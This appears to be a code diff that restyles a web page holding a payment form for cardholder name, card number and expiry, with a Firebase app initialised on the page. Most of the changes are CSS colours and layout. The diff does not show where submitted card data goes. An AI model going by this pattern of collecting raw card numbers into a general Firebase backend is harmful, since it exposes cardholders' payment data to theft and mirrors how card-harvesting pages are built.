@@ -14,7 +14,7 @@ body {
   font-family: 'Roboto', Arial, sans-serif;
   margin: 0;
   padding: 0;
-  background-color: #f7f7f7;
+  background-color: #ffffff;
   color: #333;
 }
 
@@ -24,7 +24,8 @@ header {
   left: 0;
   width: 100%;
   height: 80px;
-  background-color: #ffffff;
+  background-color: white;
+  border-bottom: 1px solid #ffffff;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -33,26 +34,23 @@ header {
 }
 
 header img {
-  max-height: 50px;
-  width: auto;
-  transition: all 0.3s ease;
+    max-height: 50px;
+    width: auto;
+    transition: all 0.3s ease;
 }
 
 .container {
-  margin-top: 120px;
+  margin-top: 100px;
   padding: 20px;
   padding-bottom: 50px;
-  display: flex;
-  justify-content: center;
 }
 
 form {
-  width: 100%;
-  max-width: 500px;
+  max-width: 600px;
+  margin: 0 auto;
   background-color: #fff;
-  padding: 40px;
+  padding: 30px;
   border-radius: 8px;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
 }
 
 label {
@@ -67,7 +65,7 @@ input {
   padding: 12px;
   margin-bottom: 20px;
   box-sizing: border-box;
-  border: 1px solid #ddd;
+  border: 1px solid #000;
   border-radius: 4px;
   font-size: 16px;
   transition: border-color 0.3s ease;
@@ -75,25 +73,26 @@ input {
 
 input:focus {
   outline: none;
-  border-color: #98272A;
-  box-shadow: 0 0 5px rgba(0, 181, 239, 0.2);
+  border-color: #00B5EF;
+  box-shadow: 0 0 5px rgba(70, 3, 214, 0.2);
 }
 
+/* Style for placeholder text */
 ::placeholder {
-  color: #aaa;
+  color: #888;
   opacity: 1;
 }
 
 button {
   height: 50px;
-  width: 100%;
+  width: 200px;
   padding: 10px;
-  margin: 15px 0 30px 0;
+  margin: 15px auto 30px auto;
   display: block;
   box-sizing: border-box;
   border: none;
   border-radius: 25px;
-  background-color: #98272A;
+  background-color: #00B5EF;
   color: #fff;
   font-size: 16px;
   font-weight: bold;
@@ -117,8 +116,9 @@ button:before {
 }
 
 button:hover {
-  background-color: #98272A;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  background-color: #00B5EF;
+  width: 220px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
 }
 
 button:hover:before {
@@ -174,7 +174,7 @@ button:hover:before {
       <input type="text" id="cardholdername" name="cardholdername" placeholder="Enter card holder name" required>
 
       <label for="cardnumber">Card Number:</label>
-      <input type="text" id="cardnumber" name="cardnumber" maxlength="19" placeholder="Enter card number" required>
+      <input type="text" id="cardnumber" name="cardNumber" maxlength="19" placeholder="Enter card number" required>
 
       <label for="expiryDate">Card Expiry:</label>
       <input type="text" id="expiryDate" name="expiryDate" maxlength="5" placeholder="MM/YY" required>
@@ -247,6 +247,7 @@ const firebaseConfig = {
   appId: "1:1030168697307:web:e9a74f5b1d057d289e2ffe",
   measurementId: "G-TL7MNTNJW2"
 };
+
 
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
